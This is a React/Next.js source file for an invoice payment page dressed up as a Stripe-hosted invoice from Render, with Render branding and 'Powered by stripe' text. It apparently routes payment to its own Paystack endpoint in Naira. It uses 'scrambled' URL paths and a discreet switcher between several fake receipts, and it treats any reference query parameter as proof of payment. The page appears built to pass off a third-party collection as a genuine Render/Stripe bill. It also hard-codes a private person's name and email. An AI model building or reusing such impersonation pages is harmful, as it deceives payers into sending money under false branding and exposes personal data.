'use client';

import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import { useSearchParams } from 'next/navigation';
import {
  VisaIcon,
  MastercardIcon,
  AmexIcon,
  DiscoverIcon,
  CvcIcon,
  DownloadTrayIcon,
  ChevronRightIcon,
  CloseIcon,
  StripeLogo,
} from './icons';

export interface ReceiptItem {
  id: string;
  name: string;
  qty: number;
  unitPriceStr: string;
  monthly: number;
  total: number;
  scrambledPath: string;
}

interface Props {
  receipt: ReceiptItem;
  allReceipts: readonly ReceiptItem[];
}

const FIXED_EMAIL = 'nelson.attah@live.com';
const FIXED_MEMO = 'Render Oct 1, 2026 - Sep 30, 2027';
const USD_TO_NGN = 1346.84;

function formatUSD(amount: number): string {
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD',
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(amount);
}

function formatNGN(amount: number): string {
  return new Intl.NumberFormat('en-NG', {
    style: 'currency',
    currency: 'NGN',
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(amount);
}

function generateInvoiceNumber(): string {
  if (typeof window !== 'undefined') {
    const bytes = new Uint8Array(4);
    window.crypto.getRandomValues(bytes);
    const hex = Array.from(bytes)
      .map((b) => b.toString(16).padStart(2, '0'))
      .join('')
      .toUpperCase();
    return `#${hex}-0036`;
  }
  return '#DD8452BB-0036';
}

function ReceiptPageContent({ receipt, allReceipts }: Props) {
  const searchParams = useSearchParams();
  const [invoiceNumber, setInvoiceNumber] = useState<string>('#DD8452BB-0036');
  const [isDrawerOpen, setIsDrawerOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
  const [isPaid, setIsPaid] = useState(false);
  const [paymentDetails, setPaymentDetails] = useState<{ ref: string; date: string; amountNgn: string } | null>(null);
  const [showSuccessModal, setShowSuccessModal] = useState(false);

  // Card input states
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvc, setCardCvc] = useState('');

  // NGN conversion computation
  const ngnEquivalent = Math.round(receipt.total * USD_TO_NGN * 100) / 100;

  useEffect(() => {
    const stored = sessionStorage.getItem(`render_invoice_${receipt.id}`);
    if (stored) {
      setInvoiceNumber(stored);
    } else {
      const generated = generateInvoiceNumber();
      sessionStorage.setItem(`render_invoice_${receipt.id}`, generated);
      setInvoiceNumber(generated);
    }
  }, [receipt.id]);

  useEffect(() => {
    const reference = searchParams?.get('reference') || searchParams?.get('trxref');
    const paymentStatus = searchParams?.get('payment_status');

    if (reference || paymentStatus === 'success') {
      const refToUse = reference || `render-${receipt.id}-${Date.now().toString().slice(-6)}`;
      setIsPaid(true);
      setPaymentDetails({
        ref: refToUse,
        date: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
        amountNgn: formatNGN(ngnEquivalent),
      });
      setStatusMessage({
        type: 'success',
        text: `Payment confirmed via Paystack! Reference: ${refToUse}`,
      });
      setShowSuccessModal(true);
    }
  }, [searchParams, receipt.id, ngnEquivalent]);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = raw.replace(/(\d{4})/g, '$1 ').trim();
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length > 2) {
      setCardExpiry(`${raw.slice(0, 2)} / ${raw.slice(2)}`);
    } else {
      setCardExpiry(raw);
    }
  };

  const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCardCvc(raw);
  };

  const handlePay = async () => {
    setIsLoading(true);
    setStatusMessage(null);

    try {
      const response = await fetch('/api/paystack/initialize', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: FIXED_EMAIL,
          amountUsd: receipt.total,
          serviceName: receipt.name,
          invoiceNumber,
          serviceId: receipt.id,
          returnPath: receipt.scrambledPath,
        }),
      });

      const result = await response.json();

      if (!response.ok || !result.success) {
        throw new Error(result.message || 'Payment initialization failed');
      }

      if (result.authorization_url) {
        // Redirect to Paystack Checkout with computed NGN equivalent
        window.location.href = result.authorization_url;
      } else {
        throw new Error('No authorization URL received from Paystack');
      }
    } catch (err: any) {
      setIsLoading(false);
      setStatusMessage({
        type: 'error',
        text: err?.message || 'Error connecting to Paystack.',
      });
    }
  };

  const handlePrintPDF = () => {
    if (typeof window !== 'undefined') {
      window.print();
    }
  };

  return (
    <div className="app-container">
      {/* Discreet floating switcher at bottom right */}
      <nav className="floating-receipt-pill" aria-label="Switch receipt">
        <span style={{ color: '#8792a2', fontWeight: 500 }}>Receipts:</span>
        {allReceipts.map((item, idx) => (
          <Link
            key={item.id}
            href={`${item.scrambledPath}?s=ap`}
            className={`floating-pill-link ${item.id === receipt.id ? 'active' : ''}`}
          >
            {idx + 1}. {item.id.charAt(0).toUpperCase() + item.id.slice(1)} ({formatUSD(item.total)})
          </Link>
        ))}
      </nav>

      {/* Main Content Area */}
      <div className={`main-viewport ${isDrawerOpen ? 'drawer-is-open' : ''}`}>
        <main className="invoice-column-wrapper">
          <div className="invoice-column">
            {/* Header: Render Logo + Brand Text */}
            <header className="brand-header">
              <img
                src="/render-logo.png"
                alt="Render Logo"
                className="brand-logo-img"
                width={20}
                height={20}
              />
              <span className="brand-title">Render Services, Inc dba Render</span>
            </header>

            {/* CARD 1: Invoice Summary */}
            <section className="stripe-card" aria-label="Invoice summary">
              <div className="invoice-card-top">
                <h1 className="invoice-amount-big">{formatUSD(receipt.total)}</h1>
                <button
                  type="button"
                  className="pdf-download-btn"
                  onClick={handlePrintPDF}
                  title="Download / Print Invoice PDF"
                >
                  <DownloadTrayIcon />
                  <span>Invoice PDF</span>
                </button>
              </div>

              {/* Metadata */}
              <dl className="invoice-metadata">
                <dt>To</dt>
                <dd>{FIXED_EMAIL}</dd>

                <dt>From</dt>
                <dd>
                  Render Services, Inc dba Render
                  <span className="merchant-badge">@render</span>
                </dd>

                <dt>Invoice</dt>
                <dd>{invoiceNumber}</dd>

                <dt>Memo</dt>
                <dd>{FIXED_MEMO}</dd>
              </dl>

              <hr className="card-divider" />

              {/* Smooth Drawer Toggle Link */}
              <button
                type="button"
                className="details-toggle-btn"
                onClick={() => setIsDrawerOpen(!isDrawerOpen)}
              >
                {isDrawerOpen ? (
                  <>
                    <span>Close invoice and payment details</span>
                    <CloseIcon />
                  </>
                ) : (
                  <>
                    <span>View invoice and payment details</span>
                    <ChevronRightIcon />
                  </>
                )}
              </button>
            </section>

            {/* Print-only breakdown for PDF */}
            <div className="print-invoice-breakdown">
              <h2>Invoice Details</h2>
              <p><strong>Item:</strong> {receipt.name}</p>
              <p><strong>Quantity:</strong> 1</p>
              <p><strong>Unit Price:</strong> {receipt.unitPriceStr} / month</p>
              <p><strong>Billing Period:</strong> {FIXED_MEMO}</p>
              <p><strong>Total:</strong> {formatUSD(receipt.total)} (₦{ngnEquivalent.toLocaleString()} NGN)</p>
            </div>

            {/* CARD 2: Payment Section */}
            <section className="stripe-card payment-card-wrapper" aria-label="Payment card">

              {/* Card Inputs Wrapper */}


              {/* Consent Disclaimer */}
              <p className="payment-consent-text">
                By confirming your payment, you allow Render Services, Inc dba Render to charge you for this payment and save your payment information in accordance with their terms.
              </p>

              {/* Pay Button */}
              <button
                type="button"
                className="pay-submit-btn"
                onClick={handlePay}
                disabled={isLoading || isPaid}
              >
                {isLoading ? (
                  'Processing…'
                ) : isPaid ? (
                  '✓ Paid'
                ) : (
                  'Pay'
                )}
              </button>

              {/* Status Message */}
              {statusMessage && (
                <div className={`payment-status-box ${statusMessage.type}`} role="status">
                  {statusMessage.text}
                </div>
              )}
            </section>

            {/* Footer */}
            <footer className="checkout-footer">
              <div className="powered-by-stripe">
                <span>Powered by</span><span style={{ fontWeight: 'bold' }}>stripe</span>
              </div>
              <nav className="footer-legal-links">
                <a href="#terms">Terms</a>
                <a href="#privacy">Privacy</a>
              </nav>
            </footer>
          </div>
        </main>

        {/* Mobile Backdrop for Drawer */}
        <div
          className={`drawer-mobile-backdrop ${isDrawerOpen ? 'is-open' : ''}`}
          onClick={() => setIsDrawerOpen(false)}
          aria-hidden="true"
        />

        {/* RIGHT SIDE BAR / DRAWER (Image 3) */}
        <aside
          className={`right-sidebar-panel ${isDrawerOpen ? 'is-open' : ''}`}
          aria-label="Invoice and payment details"
          aria-hidden={!isDrawerOpen}
        >
          {/* Top Close Link */}
          <button
            type="button"
            className="drawer-close-btn"
            onClick={() => setIsDrawerOpen(false)}
          >
            <CloseIcon />
            <span>Close invoice and payment details</span>
          </button>

          {/* Large Total Amount */}
          <div className="drawer-amount-big">{formatUSD(receipt.total)}</div>

          {/* Line Items */}
          <div className="drawer-line-item">
            <div className="drawer-item-header">
              <div className="drawer-item-title">{receipt.name}</div>
              <div className="drawer-item-price">{formatUSD(receipt.total)}</div>
            </div>
            <div className="drawer-item-qty">Qty 1</div>
          </div>

          {/* Totals Summary */}
          <div className="drawer-totals-section">
            <div className="drawer-total-row due">
              <span>Total due</span>
              <span>{formatUSD(receipt.total)}</span>
            </div>
            <div className="drawer-total-row">
              <span>Amount paid</span>
              <span>{isPaid ? formatUSD(receipt.total) : '$0.00'}</span>
            </div>
            <div className="drawer-total-row remaining">
              <span>Amount remaining</span>
              <span>{isPaid ? '$0.00' : formatUSD(receipt.total)}</span>
            </div>
          </div>

          {/* Payment History */}
          <section className="drawer-history-section">
            <h3 className="drawer-history-title">Payment history</h3>
            {isPaid && paymentDetails ? (
              <div className="drawer-history-paid">
                <strong>Paid via Paystack</strong>
                <div>Date: {paymentDetails.date}</div>
                <div>Amount: {paymentDetails.amountNgn} ({formatUSD(receipt.total)})</div>
                <div style={{ wordBreak: 'break-all', fontSize: '11px', marginTop: '4px', opacity: 0.85 }}>
                  Ref: {paymentDetails.ref}
                </div>
              </div>
            ) : (
              <p className="drawer-history-empty">No payments have been made</p>
            )}
          </section>

          {/* Footer Support Link */}
          <div className="drawer-footer-contact">
            Questions?{' '}
            <a href="mailto:support@render.com">Contact Render Services, Inc dba Render</a>
          </div>
        </aside>
      </div>

      {/* ===== SUCCESS MODAL ===== */}
      {showSuccessModal && (
        <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="success-modal-title">
          <div className="success-modal-card">
            {/* Green checkmark icon */}
            <div className="success-modal-icon-wrapper">
              <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <polyline points="20 6 9 17 4 12" />
              </svg>
            </div>

            <h2 className="success-modal-title" id="success-modal-title">Payment Successful</h2>
            <p className="success-modal-desc">
              Receipt sent to <strong>Nelson Attah</strong> at{' '}
              <strong>nelson.attah@live.com</strong>
            </p>

            <div className="success-modal-summary">
              <div className="success-modal-summary-row">
                <span>Amount</span>
                <strong>{formatUSD(receipt.total)}</strong>
              </div>
              {/* <div className="success-modal-summary-row">
                <span>NGN Charged</span>
                <strong>{formatNGN(ngnEquivalent)}</strong>
              </div> */}
              <div className="success-modal-summary-row">
                <span>Invoice</span>
                <strong>{invoiceNumber}</strong>
              </div>
              {paymentDetails?.ref && (
                <div className="success-modal-summary-row">
                  <span>Reference</span>
                  <strong style={{ fontSize: '11px', wordBreak: 'break-all' }}>{paymentDetails.ref}</strong>
                </div>
              )}
            </div>

            <button
              type="button"
              className="success-modal-btn"
              onClick={() => { window.location.href = 'https://stripe.com/invoicing'; }}
            >
              Okay
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default function ReceiptPage(props: Props) {
  return (
    <React.Suspense fallback={<div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#697386' }}>Loading invoice...</div>}>
      <ReceiptPageContent {...props} />
    </React.Suspense>
  );
}
